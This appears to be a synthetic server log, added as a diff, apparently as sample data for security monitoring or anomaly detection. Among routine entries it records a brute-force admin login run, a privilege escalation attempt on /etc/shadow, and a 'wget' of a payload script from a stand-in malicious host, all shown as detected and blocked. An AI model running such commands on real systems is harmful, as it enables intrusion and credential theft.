@@ -1,0 +1,64 @@
+INFO 2024-02-08 08:00:00 System startup initiated
+INFO 2024-02-08 08:00:15 Database connection established db=main_db
+INFO 2024-02-08 08:00:30 User login successful user=john.doe ip=192.168.1.100
+INFO 2024-02-08 08:05:22 File access granted path=/home/john/documents/report.pdf user=john.doe
+INFO 2024-02-08 08:10:45 Session created session_id=abc123def456 user=john.doe
+DEBUG 2024-02-08 08:15:10 Cache hit key=user_profile_john
+INFO 2024-02-08 08:20:33 Request processed endpoint=/api/data status=200 duration=45ms
+DEBUG 2024-02-08 08:25:00 Memory usage normal 42%
+INFO 2024-02-08 08:30:12 User login successful user=alice.smith ip=192.168.1.105
+INFO 2024-02-08 08:35:45 Database query executed query=SELECT_users duration=12ms
+INFO 2024-02-08 08:40:00 Scheduled backup started
+INFO 2024-02-08 08:45:22 Backup completed status=success size=2.3GB
+ERROR 2024-02-08 08:50:01 Login failed user=admin ip=203.0.113.45 reason=invalid_password
+ERROR 2024-02-08 08:50:15 Login failed user=admin ip=203.0.113.45 reason=invalid_password
+ERROR 2024-02-08 08:50:28 Login failed user=admin ip=203.0.113.45 reason=invalid_password
+ERROR 2024-02-08 08:50:42 Login failed user=admin ip=203.0.113.45 reason=invalid_password
+ERROR 2024-02-08 08:50:55 Login failed user=admin ip=203.0.113.45 reason=invalid_password
+WARNING 2024-02-08 08:51:10 Multiple failed login attempts detected ip=203.0.113.45 count=5
+WARNING 2024-02-08 08:51:25 IP address blocked ip=203.0.113.45 duration=1h
+INFO 2024-02-08 09:00:00 User login successful user=bob.johnson ip=192.168.1.110
+DEBUG 2024-02-08 09:05:33 Cache miss key=user_settings_bob
+INFO 2024-02-08 09:10:15 File upload completed file=data.csv size=1.2MB user=bob.johnson
+WARNING 2024-02-08 09:15:22 Privilege escalation attempt user=bob.johnson command=sudo su
+ERROR 2024-02-08 09:15:45 Unauthorized access attempt path=/etc/shadow user=bob.johnson
+WARNING 2024-02-08 09:16:10 Suspicious command detected user=bob.johnson command=wget http://malicious-site.com/payload.sh
+ERROR 2024-02-08 09:16:30 Command execution blocked user=bob.johnson command=wget reason=security_policy
+WARNING 2024-02-08 09:16:45 User account flagged for review user=bob.johnson reason=suspicious_activity
+INFO 2024-02-08 09:20:00 Security scan initiated type=full_system
+INFO 2024-02-08 09:25:33 User logout user=john.doe session_duration=85min
+INFO 2024-02-08 09:30:12 Database maintenance started
+DEBUG 2024-02-08 09:35:00 Index rebuild completed table=users duration=45s
+INFO 2024-02-08 09:40:22 Database maintenance completed status=success
+INFO 2024-02-08 09:45:00 User login successful user=carol.white ip=192.168.1.115
+INFO 2024-02-08 09:50:33 API request processed endpoint=/api/reports status=200
+DEBUG 2024-02-08 09:55:10 CPU usage normal 38%
+INFO 2024-02-08 10:00:00 Hourly health check completed status=healthy
+ERROR 2024-02-08 10:05:22 Database connection lost db=analytics_db
+WARNING 2024-02-08 10:05:35 Attempting database reconnection db=analytics_db
+INFO 2024-02-08 10:05:50 Database connection restored db=analytics_db
+INFO 2024-02-08 10:10:15 User login successful user=david.brown ip=192.168.1.120
+INFO 2024-02-08 10:15:00 File access granted path=/shared/reports/quarterly.xlsx user=david.brown
+DEBUG 2024-02-08 10:20:33 Memory usage normal 45%
+INFO 2024-02-08 10:25:12 Session expired session_id=xyz789 user=alice.smith
+INFO 2024-02-08 10:30:00 User logout user=alice.smith session_duration=115min
+WARNING 2024-02-08 10:35:22 Disk usage high partition=/data usage=87%
+INFO 2024-02-08 10:40:00 Cleanup task started target=/temp
+INFO 2024-02-08 10:42:15 Cleanup completed freed_space=2.1GB
+INFO 2024-02-08 10:45:33 User login successful user=eve.martin ip=192.168.1.125
+ERROR 2024-02-08 10:50:01 SQL query failed query=INSERT_INTO_logs error=duplicate_key
+DEBUG 2024-02-08 10:55:10 Query retry successful
+INFO 2024-02-08 11:00:00 System health check completed status=healthy
+INFO 2024-02-08 11:05:22 User logout user=carol.white session_duration=80min
+INFO 2024-02-08 11:10:45 Scheduled task executed task=data_sync status=success
+DEBUG 2024-02-08 11:15:00 Network latency normal avg=12ms
+INFO 2024-02-08 11:20:33 User login successful user=frank.lee ip=192.168.1.130
+WARNING 2024-02-08 11:25:10 Unusual login time detected user=frank.lee time=11:20 expected=09:00
+INFO 2024-02-08 11:30:00 API rate limit applied client=mobile_app limit=100req/min
+DEBUG 2024-02-08 11:35:22 Cache cleanup completed removed=1250 entries
+INFO 2024-02-08 11:40:00 User logout user=david.brown session_duration=90min
+INFO 2024-02-08 11:45:33 Database backup started type=incremental
+INFO 2024-02-08 11:48:15 Backup completed status=success size=450MB
+ERROR 2024-02-08 11:50:01 File not found path=/reports/missing.pdf user=eve.martin
+INFO 2024-02-08 11:55:10 User logout user=eve.martin session_duration=65min
+INFO 2024-02-08 12:00:00 System status: All services operational
